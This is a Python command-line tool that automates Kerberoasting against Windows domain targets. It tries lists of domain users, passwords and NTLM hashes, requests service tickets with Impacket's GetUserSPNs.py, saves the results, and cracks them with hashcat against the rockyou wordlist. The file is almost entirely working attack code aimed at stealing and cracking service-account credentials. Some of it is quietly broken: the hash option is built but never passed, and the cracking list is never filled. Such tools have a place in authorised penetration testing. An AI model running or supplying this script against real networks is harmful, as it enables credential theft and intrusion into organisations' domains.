#!/usr/bin/env python3
import argparse
import subprocess
import sys
import os
import json
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional

# Import the shared config and logger
try:
    from config import DOMAIN_USERS, DOMAIN_PASSWORDS, NTLM_HASHES, TARGETS
except ImportError:
    print("Error: config.py not found. Please create it with the required variables.")
    sys.exit(1)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Logger:
    @staticmethod
    def section(text: str):
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{text.center(50)}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}\n")

    @staticmethod
    def subsection(text: str):
        print(f"\n{Colors.YELLOW}{'-' * 40}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{text}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{'-' * 40}{Colors.ENDC}\n")

    @staticmethod
    def command(cmd: str):
        print(f"{Colors.CYAN}[+] Executing: {cmd}{Colors.ENDC}\n")

    @staticmethod
    def success(text: str):
        print(f"{Colors.GREEN}[+] {text}{Colors.ENDC}")

    @staticmethod
    def error(text: str):
        print(f"{Colors.RED}[-] {text}{Colors.ENDC}")

    @staticmethod
    def info(text: str):
        print(f"{Colors.BLUE}[*] {text}{Colors.ENDC}")

class KerberoastAutomation:
    def __init__(self):
        self.results_dir = Path("results/kerberoast")
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.start_time = None
        self.end_time = None
        self.found_tickets = []
        
    def execute_command(self, command: str, description: str) -> str:
        """Execute a shell command and return its output"""
        try:
            Logger.command(command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            if result.returncode == 0:
                if output.strip():
                    Logger.success(f"Successfully completed: {description}")
                else:
                    Logger.info("Command completed but no output returned")
            else:
                Logger.error(f"Command failed: {output}")
                
            return output
        except Exception as e:
            Logger.error(f"Error executing command: {str(e)}")
            return str(e)
    
    def save_results(self, target: str, output: str, result_type: str) -> Path:
        """Save command results to a file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('.', '_')}_{result_type}_{timestamp}.txt"
        filepath = self.results_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(output)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def save_ticket(self, target: str, output: str) -> Path:
        """Save Kerberos ticket to a file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('.', '_')}_ticket_{timestamp}.kirbi"
        filepath = self.results_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(output)
        
        Logger.success(f"Ticket saved to {filepath}")
        return filepath
    
    def check_for_SPNs(self, target: str, domain: str, username: str, password: str = None, hash_value: str = None) -> Optional[str]:
        """Check for Service Principal Names (SPNs) using GetUserSPNs.py"""
        auth_option = ""
        if password:
            auth_option = f"-password {password}"
        elif hash_value:
            auth_option = f"-hashes {hash_value}"
        
        command = f"GetUserSPNs.py {domain}/{username}:{password or ''} -dc-ip {target} -request"
        output = self.execute_command(command, "Checking for SPNs and requesting TGS tickets")
        
        if "Impacket v" in output and "ServicePrincipalName" in output:
            Logger.success(f"Found SPNs for domain {domain} on target {target}")
            self.save_results(target, output, "spns")
            return output
        return None
    
    def crack_tickets(self, ticket_file: Path) -> str:
        """Attempt to crack Kerberos tickets using hashcat"""
        command = f"hashcat -m 13100 {ticket_file} wordlists/rockyou.txt -r rules/best64.rule"
        output = self.execute_command(command, "Cracking Kerberos tickets with hashcat")
        return output
    
    def kerberoast_target(self, target: str) -> Dict[str, Any]:
        """Perform Kerberoasting against a single target"""
        target_results = {
            "target": target,
            "success": False,
            "domain": None,
            "spns_found": 0,
            "tickets_obtained": 0,
            "credentials": []
        }
        
        # First, try to determine the domain name for the target
        domain_cmd = f"nslookup {target} | grep 'Name:' | awk '{{print $2}}' | cut -d'.' -f2-"
        domain_output = self.execute_command(domain_cmd, "Determining domain name")
        domain = domain_output.strip() if domain_output.strip() else "WORKGROUP"
        target_results["domain"] = domain
        
        Logger.section(f"Kerberoasting {target} (Domain: {domain})")
        
        # Try each user in the config
        for username in DOMAIN_USERS:
            Logger.subsection(f"Trying user: {username}")
            
            # First try with password
            for password in DOMAIN_PASSWORDS:
                Logger.info(f"Attempting with password")
                spn_output = self.check_for_SPNs(target, domain, username, password=password)
                
                if spn_output:
                    target_results["success"] = True
                    target_results["spns_found"] += spn_output.count("ServicePrincipalName")
                    target_results["tickets_obtained"] += 1
                    target_results["credentials"].append({
                        "username": username,
                        "password": password,
                        "hash": None
                    })
                    break
            
            # If password didn't work, try with hash
            if not target_results["success"]:
                for hash_value in NTLM_HASHES:
                    Logger.info(f"Attempting with NTLM hash")
                    spn_output = self.check_for_SPNs(target, domain, username, hash_value=hash_value)
                    
                    if spn_output:
                        target_results["success"] = True
                        target_results["spns_found"] += spn_output.count("ServicePrincipalName")
                        target_results["tickets_obtained"] += 1
                        target_results["credentials"].append({
                            "username": username,
                            "password": None,
                            "hash": hash_value
                        })
                        break
            
            if target_results["success"]:
                break
        
        return target_results
    
    def run(self, targets: Optional[List[str]] = None) -> None:
        """Run Kerberoasting against multiple targets"""
        self.start_time = datetime.now()
        Logger.section("Starting Kerberoasting")
        Logger.info(f"Start Time: {self.start_time}")
        
        targets_to_scan = targets or TARGETS
        if not targets_to_scan:
            Logger.error("No targets specified. Add targets to config.py or provide them as arguments.")
            return
        
        all_results = []
        
        for target in targets_to_scan:
            target_result = self.kerberoast_target(target)
            all_results.append(target_result)
            
            if target_result["success"]:
                Logger.success(f"Successfully Kerberoasted {target}")
            else:
                Logger.error(f"Failed to Kerberoast {target}")
        
        self.end_time = datetime.now()
        duration = self.end_time - self.start_time
        
        Logger.section("Kerberoasting Summary")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"End Time: {self.end_time}")
        Logger.info(f"Duration: {duration}")
        Logger.info(f"Targets scanned: {len(targets_to_scan)}")
        Logger.info(f"Successful Kerberoasts: {sum(1 for r in all_results if r['success'])}")
        
        # Save summary to JSON
        summary_path = self.results_dir / f"kerberoast_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(summary_path, 'w') as f:
            json.dump({
                "start_time": str(self.start_time),
                "end_time": str(self.end_time),
                "duration": str(duration),
                "targets": targets_to_scan,
                "results": all_results
            }, f, indent=4)
        
        Logger.success(f"Summary saved to {summary_path}")
        
        # Attempt to crack obtained tickets
        if self.found_tickets:
            Logger.section("Cracking Kerberos Tickets")
            for ticket_file in self.found_tickets:
                self.crack_tickets(ticket_file)

def main():
    parser = argparse.ArgumentParser(description=f'{Colors.BOLD}Kerberoasting Automation Tool{Colors.ENDC}')
    parser.add_argument('-t', '--targets', nargs='+', help='Target IP addresses or hostnames to scan (optional, uses config.py if not specified)')
    
    args = parser.parse_args()
    
    kerberoast = KerberoastAutomation()
    kerberoast.run(args.targets)

if __name__ == "__main__":
    main()